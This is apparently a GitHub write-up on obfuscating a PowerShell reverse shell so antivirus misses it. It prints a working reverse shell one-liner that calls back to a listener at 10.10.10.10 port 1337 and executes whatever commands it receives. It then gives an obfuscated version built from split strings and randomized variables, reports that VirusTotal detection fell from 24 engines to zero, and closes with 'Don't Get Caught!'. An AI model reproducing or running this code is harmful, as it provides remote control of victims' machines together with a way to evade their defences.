# Powershell_Obfuscation_WriteUP

**For Research Purposes Only!!**

Hello All,
I want to start with my limitations.
In order to test this all I did was save the reverse shells as .ps1 script files and pass them to Virustotal.
This does not take into play AMSI and othe AI based tools watching the commands in a target's environment. Much more testing needs to be done before applying to your target.

That being said my first step was save a standard powershell reverse shell as a powershell script (Command Below) and pass to VirusTotal. I received the results in the screenshot below.

Powershell Reverse Shell:
#powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


![Settings Window](https://raw.github.com/jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/exprevshellvt.png)

It was 24 out of 62 Antirus Solutions that caught it. Seems low but once again other solutions are used such as AMSI to and AI to catch this. 

Next I tried adding common obfuscation techniques such as String Concatenation, Camel Case, Randomized Variables, and extra "Junk".
I also saved as a .ps1 file and passed to Virustotal. I got the results in the screenshot below. I also added the newly obfuscated command below.

Powershell Obfuscated Reverse Shell:
#POWerSHell -noP -C ($ASU0KyS + (-join(' = New','-','Object ','Syste','m.N','e','t.','Sock','e','ts.TCP','C','li','ent(','''10.','1','0.1','0.','10'',1337',')',';')) + $sEN2 + (-join(' ','=',' ')) + $ASU0KyS + (-join('.GetS','tream(',');[byte[',']]')) + $KeB5V + (' = 0'+'.'+'.65535'+'|%{0};'+'while('+'(') + $m1d5nud + (' '+'='+' ') + $sEN2 + ('.'+'Rea'+'d'+'(') + $KeB5V + (-join(', 0',', ')) + $KeB5V + (-join('.Length',')) -n','e 0){',';')) + $pRzocCa2 + (' '+'= (N'+'ew-O'+'bj'+'ect -Typ'+'eNam'+'e S'+'ystem'+'.Text'+'.AS'+'CIIE'+'nc'+'oding).'+'GetStr'+'ing'+'(') + $KeB5V + (','+'0,'+' ') + $m1d5nud + ');' + $FgI9ey + (-join(' = (','i','ex ')) + $pRzocCa2 + (' 2>&1 |'+' Out-S'+'tring'+' )'+';') + $JpTGPxE + (' ='+' ') + $FgI9ey + (' +'+' ''PS '' +'+' ('+'pw'+'d).Path '+'+ ''>'+' '''+';') + $f8bTWAM + (-join(' = ([tex','t.e','nco','ding',']',':',':AS','CII).','GetB','yte','s(')) + $JpTGPxE + ');' + $sEN2 + (-join('.Wr','it','e(')) + $f8bTWAM + (-join(',0',',')) + $f8bTWAM + ('.Le'+'ng'+'th'+');') + $sEN2 + ('.Flus'+'h()}'+';') + $ASU0KyS + ('.Cl'+'ose'+'()'))
if ((Get-Random -Minimum 1000 -Maximum 5000) -lt 0) {
    Get-Service | Where-Object {$_.Status -eq 'Running' -and $_.DisplayName -like '*SQL*'} | ForEach-Object { Write-Debug "Found running SQL Service: $($_.Name)" }
}
Get-Command -Name 'Write-Host' | Select-Object -ExpandProperty Name | Out-Null



![Settings Window](https://raw.github.com//jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/exprevshellobfuscated.png)

POOF! Down to Zero. Once again much more testing needs to be done. But this may show (for now) that even some basic obfuscation techniques could be the difference between a compromise or a fail.
Have Fun and Don't Get Caught!
